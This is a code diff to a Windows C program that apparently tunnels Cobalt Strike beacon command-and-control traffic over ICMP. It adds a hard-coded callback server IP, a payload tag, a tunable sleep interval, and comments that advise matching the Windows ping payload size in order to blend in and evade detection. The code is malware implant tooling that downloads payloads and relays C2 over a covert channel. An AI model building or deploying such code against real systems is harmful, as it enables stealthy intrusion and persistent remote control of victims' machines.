@@ -22,20 +22,41 @@ To compile on Windows: link with ws2_32.lib
 #include <winsock2.h>
 #include <windows.h>
 
+//Do not touch these. The server is currently setup to only look for 8 & 0 ICMP requests. This may change in the future
 #define ICMP_ECHO       8
 #define ICMP_ECHOREPLY  0
 
-// size of payload/data section of ICMP (excluding the 8-byte ICMP header)
-#define ICMP_PAYLOAD_SIZE 500  // in bytes
+/*
+Sleep in MS, for each ICMP message back.
 
+NOTE - if you set this to something longer than a second, and have a small payload size, it will take a while
+to download your enitre payload.
+
+*/
+#define SLEEP_TIME 1000 
+
+// size of payload/data section of ICMP (excluding the 8-byte ICMP header)
+#define ICMP_PAYLOAD_SIZE 500  // in bytes, 
+/*
+adjust this to set the max payload size per icmp request.
+
+If trying to blend in, use 32 on windows systems. (which is the default payload size of windows `ping` command).
+Note, this will send a SHITLOAD more chunks/ICMP requests in general.
+
+*/
+
+//Do not touch these either, these are needed for chunk items & size calcs
 #define IPV4_HEADER    20
 #define ICMP_HEADER    8
 #define TAG_SIZE       4
 #define MAX_PACKET_SIZE (IPV4_HEADER + ICMP_HEADER + ICMP_PAYLOAD_SIZE)
 
+//Callback server that the Controller is listenening on
 #define ICMP_CALLBACK_SERVER "172.19.241.197"
+//4 Byte tag that is icnluded in each payload. Change to whatever you want, as long as it's 4 bytes
 #define ICMP_TAG             "RQ47"
 
+//Cobalt Strike Settings - Don't touch
 #define PAYLOAD_MAX_SIZE  (512 * 1024)
 #define BUFFER_MAX_SIZE   (1024 * 1024)
 
@@ -431,7 +452,7 @@ int bridge_to_beacon() {
             free(controller_resp);
         }
 
-        Sleep(1000);
+        Sleep(SLEEP_TIME);
     }
 
     // Cleanup
